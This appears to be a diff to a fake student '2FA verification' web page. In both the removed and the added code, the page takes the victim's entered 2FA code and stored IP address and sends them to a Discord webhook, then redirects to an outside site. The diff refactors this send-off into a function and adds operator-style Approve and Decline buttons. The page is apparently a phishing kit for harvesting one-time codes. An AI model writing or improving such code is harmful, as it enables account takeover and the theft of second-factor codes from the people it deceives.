@@ -58,6 +58,14 @@
             border-radius: 5px;
             color: #fff;
         }
+        .approval-buttons {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .approval-buttons button {
+            margin: 0 10px;
+        }
     </style>
     <script>
         var studentID = "1737";  // Fixed student ID for verification
@@ -107,27 +115,39 @@
                 // Get IP address from localStorage
                 var userIP = localStorage.getItem("userIP");
 
-                // Send the notification to Discord
-                fetch(discordWebhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "User has been verified: Alyssa Linn",
-                        embeds: [{
-                            title: "Verification Success",
-                            description: `Student ID: ${studentID}\n2FA Code: ${twoFACode}\nIP Address: ${userIP}`,
-                            color: 3066993
-                        }]
-                    })
-                }).then(response => response.json())
-                  .then(data => console.log("Discord notification sent:", data))
-                  .catch(error => console.error("Error sending Discord notification:", error));
+                // Send the notification to Discord with approval
+                sendVerificationStatus("approved", userIP);
 
                 // Redirect to another page
                 window.location.href = "https://jamesaai.netlify.app";  // Redirect to the desired URL
             } else {
                 alert("Incorrect 2FA code. Please try again.");
             }
+        }
+
+        // Function to send verification status to Discord
+        function sendVerificationStatus(status, userIP) {
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `Verification ${status} for Student ID: ${studentID}`,
+                    embeds: [{
+                        title: `Verification ${status}`,
+                        description: `Student ID: ${studentID}\n2FA Code: ${twoFACode}\nIP Address: ${userIP}`,
+                        color: status === "approved" ? 3066993 : 15158332
+                    }]
+                })
+            }).then(response => response.json())
+              .then(data => console.log("Discord notification sent:", data))
+              .catch(error => console.error("Error sending Discord notification:", error));
+        }
+
+        // Function to decline verification manually
+        function declineVerification() {
+            var userIP = localStorage.getItem("userIP");
+            sendVerificationStatus("declined", userIP);
+            alert("Verification declined.");
         }
     </script>
 </head>
@@ -149,6 +169,12 @@
             <input type="text" id="2faCode" placeholder="Enter 2FA code" maxlength="6">
             <br>
             <button onclick="verify2FACode()">Submit 2FA Code</button>
+        </div>
+
+        <!-- Approval/Decline Buttons -->
+        <div class="approval-buttons">
+            <button onclick="declineVerification()">Decline</button>
+            <button onclick="verify2FACode()">Approve</button>
         </div>
     </div>
 </body>
